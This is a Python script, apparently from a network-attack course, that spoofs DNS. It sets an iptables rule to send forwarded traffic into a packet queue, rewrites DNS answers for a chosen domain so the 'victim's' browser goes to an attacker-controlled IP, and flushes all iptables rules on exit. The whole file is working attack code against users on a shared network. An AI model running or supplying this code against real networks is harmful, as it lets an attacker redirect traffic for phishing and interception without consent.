#!/usr/bin/env
import netfilterqueue
import scapy.all as scapy
import subprocess
import sys
import argparse



def run():
	set_iptables()
	create_queue()


def get_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", "--target", dest="target", help="the target string in the resource response")
	parser.add_argument("-d", "--destination", dest="destination", help="the destination IP address to send the victim's resource response to")
	arguments = parser.parse_args()
	if not arguments.target:
		parser.error("[-] please specify a target string")
	elif not arguments.destination:
		parser.error("[-] please specify a destination IP")
	else:
		return arguments



def set_iptables():
	"""
	function allows privileged user to insert rule to FORWARD chain in iptables so that userspace target NFQUEUE sends packets to queue 0
	"""
	subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"]) # using call method for
																						# python 2.7 compatibility
	#subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"]) # using call method for

	#subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"]) # using call method for



def reset_iptables():
	"""
	function removes rule inserted into iptables chain by privileged user
	"""
	subprocess.call(["iptables", "--flush"])



def create_queue():
	"""
	creates object that passes packets from queue to callback function for further operations then forwards them
	"""
	print("Note to users due to modern browser security measures, target must be a HTTP address and not use HSTS, and destination must be a local webserver as such as Apache. Your victim's browser will not be able to connect to the destination if this is not the case")
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, forge_response_packet)
	try:
		queue.run()
	except:
		print("[+] CTRL + C detected, resetting iptables")
		reset_iptables()
		sys.exit(0)



def forge_response_packet(packet):
	arguments = get_args()
	print_question(packet) 
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		if arguments.target in scapy_packet[scapy.DNSRR].rrname:
			answer = scapy.DNSRR(rrname="", rdata=str(arguments.destination))
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum
			packet.set_payload(str(scapy_packet))
			print("RESOURCE RESPONSE PACKET")
			print("\n")
			print(scapy_packet.show())
	packet.accept()


def print_question(packet):
	arguments = get_args()
	scapy_packet = scapy.IP(packet.get_payload())
	if (scapy_packet.haslayer(scapy.DNSQR) and not scapy_packet.haslayer(scapy.DNSRR)):
		if arguments.target in scapy_packet[scapy.DNSQR].qname:
			print("QUESTION RECORD PACKET")
			print("\n")
			print(scapy_packet.show())



run()
